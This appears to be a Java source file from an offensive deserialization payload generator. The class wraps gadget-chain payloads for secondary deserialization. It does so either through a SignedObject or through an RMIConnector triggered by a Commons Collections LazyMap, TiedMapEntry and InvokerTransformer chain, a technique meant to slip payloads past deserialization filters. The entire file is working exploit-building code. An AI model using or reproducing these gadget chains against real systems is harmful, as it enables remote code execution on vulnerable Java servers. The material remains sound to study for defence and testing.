package com.ppp.chain;

import com.ppp.Printer;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.io.Serializable;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 * <p>
 * 二次反序列化
 */
public class WrapSerialization {

    public static Object scheduler(Object object, SinksHelper sinksHelper) throws Exception {
        EnchantEnums wrapSerialization = sinksHelper.getWrapSerialization();

        if (wrapSerialization.equals(EnchantEnums.SignedObject)) {
            object = signedObject(object);
            Printer.yellowInfo("Wrap Serialization by SignedObject");
        } else if (wrapSerialization.equals(EnchantEnums.RMIConnector)) {
            object = rmiConnector(object);
        }
        return object;
    }

    /**
     * getter 方法调用 getObject
     *
     * @param object
     * @return
     * @throws Exception
     */
    public static Object signedObject(Object object) throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject((Serializable) object, kp.getPrivate(),
                Signature.getInstance("DSA"));
        return signedObject;
    }

    /**
     * 任意方法调用 connect
     * 需要任意方法调用
     *
     * @param object
     * @return
     * @throws Exception
     */
    public static Object rmiConnector(Object object) throws Exception {
        String s = RanDomUtils.generateRandomString(1);

        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        Reflections.setFieldValue(jmxServiceURL, "urlPath", "/stub/" + object);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

        /**
         * 以下为任意方法调用
         */
        InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);
        HashMap map = new HashMap();
        Map<Object, Object> lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, s);
        lazyMap.remove(rmiConnector);

        Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);

        return hashMap;
    }
}
